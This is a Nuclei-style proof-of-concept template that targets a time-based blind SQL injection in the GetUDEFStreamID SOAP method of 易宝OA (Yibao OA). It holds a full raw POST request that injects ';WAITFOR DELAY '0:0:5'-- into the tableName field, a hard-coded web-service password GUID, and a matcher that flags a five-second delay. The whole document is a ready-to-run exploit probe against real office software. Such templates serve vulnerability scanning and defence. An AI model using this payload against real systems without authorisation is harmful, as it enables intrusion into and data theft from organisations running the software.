id: poc-ouv5xv5swh9qqx3e
info:
  name: 易宝OA GetUDEFStreamID 存在Sql注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - "POST /WebService/BasicService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetUDEFStreamID\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetUDEFStreamID xmlns=\"http://tempuri.org/\">\n      <tableName>';WAITFOR DELAY '0:0:5'--</tableName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </GetUDEFStreamID>\n  </soap:Body>\n</soap:Envelope>"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
